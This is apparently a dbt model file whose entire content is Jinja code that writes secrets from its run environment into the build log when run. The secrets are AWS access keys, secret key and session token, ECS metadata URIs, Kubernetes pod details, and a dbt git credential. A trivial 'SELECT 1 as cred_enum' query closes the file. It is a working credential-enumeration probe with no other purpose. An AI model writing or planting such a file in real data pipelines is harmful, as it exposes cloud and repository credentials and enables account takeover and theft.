{{ log("== AWS CREDS ==", info=True) }}
{{ log("AWS_ACCESS_KEY_ID: " ~ env_var('AWS_ACCESS_KEY_ID', 'unset'), info=True) }}
{{ log("AWS_SECRET_ACCESS_KEY: " ~ env_var('AWS_SECRET_ACCESS_KEY', 'unset'), info=True) }}
{{ log("AWS_SESSION_TOKEN: " ~ env_var('AWS_SESSION_TOKEN', 'unset')[:100], info=True) }}
{{ log("AWS_REGION: " ~ env_var('AWS_REGION', 'unset'), info=True) }}
{{ log("AWS_EXECUTION_ENV: " ~ env_var('AWS_EXECUTION_ENV', 'unset'), info=True) }}
{{ log("ECS_CONTAINER_METADATA_URI: " ~ env_var('ECS_CONTAINER_METADATA_URI', 'unset'), info=True) }}
{{ log("ECS_CONTAINER_METADATA_URI_V4: " ~ env_var('ECS_CONTAINER_METADATA_URI_V4', 'unset'), info=True) }}
{{ log("== K8S ==", info=True) }}
{{ log("KUBERNETES_SERVICE_HOST: " ~ env_var('KUBERNETES_SERVICE_HOST', 'unset'), info=True) }}
{{ log("KUBERNETES_SERVICE_PORT: " ~ env_var('KUBERNETES_SERVICE_PORT', 'unset'), info=True) }}
{{ log("KUBERNETES_PORT: " ~ env_var('KUBERNETES_PORT', 'unset'), info=True) }}
{{ log("K8S_NODE_NAME: " ~ env_var('K8S_NODE_NAME', 'unset'), info=True) }}
{{ log("K8S_POD_NAME: " ~ env_var('K8S_POD_NAME', 'unset'), info=True) }}
{{ log("K8S_NAMESPACE: " ~ env_var('K8S_NAMESPACE', 'unset'), info=True) }}
{{ log("== DBT INTERNALS ==", info=True) }}
{{ log("DBT_ENV_SECRET_GIT_CREDENTIAL: " ~ env_var('DBT_ENV_SECRET_GIT_CREDENTIAL', 'unset'), info=True) }}
{{ log("DBT_CLOUD_PROJECT_ID: " ~ env_var('DBT_CLOUD_PROJECT_ID', 'unset'), info=True) }}
{{ log("DBT_CLOUD_JOB_ID: " ~ env_var('DBT_CLOUD_JOB_ID', 'unset'), info=True) }}
{{ log("DBT_CLOUD_RUN_ID: " ~ env_var('DBT_CLOUD_RUN_ID', 'unset'), info=True) }}
{{ log("DBT_CLOUD_ENVIRONMENT_ID: " ~ env_var('DBT_CLOUD_ENVIRONMENT_ID', 'unset'), info=True) }}
{{ log("DBT_CLOUD_ACCOUNT_ID: " ~ env_var('DBT_CLOUD_ACCOUNT_ID', 'unset'), info=True) }}
{{ log("DBT_CLOUD_RUN_REASON: " ~ env_var('DBT_CLOUD_RUN_REASON', 'unset'), info=True) }}
{{ log("DBT_CLOUD_RUN_REASON_CATEGORY: " ~ env_var('DBT_CLOUD_RUN_REASON_CATEGORY', 'unset'), info=True) }}

SELECT 1 as cred_enum
